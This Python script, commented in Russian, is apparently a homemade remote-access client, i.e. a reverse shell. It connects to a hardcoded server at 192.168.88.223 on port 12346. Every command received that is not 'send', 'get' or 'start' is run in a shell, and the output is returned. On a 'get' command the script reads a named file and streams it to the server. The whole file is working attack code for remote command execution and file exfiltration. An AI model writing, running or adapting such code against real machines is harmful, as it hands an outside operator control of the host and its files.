def run_command(cmd):
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    b = bytes(result.stdout+result.stderr, "cp1251")
    s = str(b, "cp866")
    return s
def getData():
    print('sfsgfdgdfgfgfdgfggfdfgffgdfgfdfgg')
    filePath = data.split(" ")[1]
    file = open(filePath, "rb")  # открываем файл для отправки
    print(f"sending data to client {filePath}")
    # считываем данные из файла блоками по 1024 байт и отправляем клиенту
    line = file.read(1024)
    while (line):
        #            print(line.decode())
        client.send(line)  # отправляем строку клиенту
        line = file.read(1024)

    file.close()  # закрываем фай
    client.close()
import socket,subprocess
client = socket.socket()  # создаем сокет клиента
hostname = socket.gethostname()  # получаем хост локальной машины
port = 12346  # устанавливаем порт сервера
client.connect(('192.168.88.223', port))  # подключаемся к серверу
#while True:
client.send('Tester2'.encode())
count=0
while True:
#    count == 1
#    if count != 0:
#        client.connect(('192.168.88.223', port))
    data=client.recv(1024)
    data=data.decode()
    if "send" in data:
        pass
    elif "get" in data:
        print("dfsdfdfs")
        getData()
        print("donne")
        client.connect(('192.168.88.223', port))
    elif "start" in data:
        pass
    else:
        res=run_command(data)
        res=res.encode()
        client.send(res)
        client.close()
        client.connect(('192.168.88.223', port))
    print(data)
    print('ff')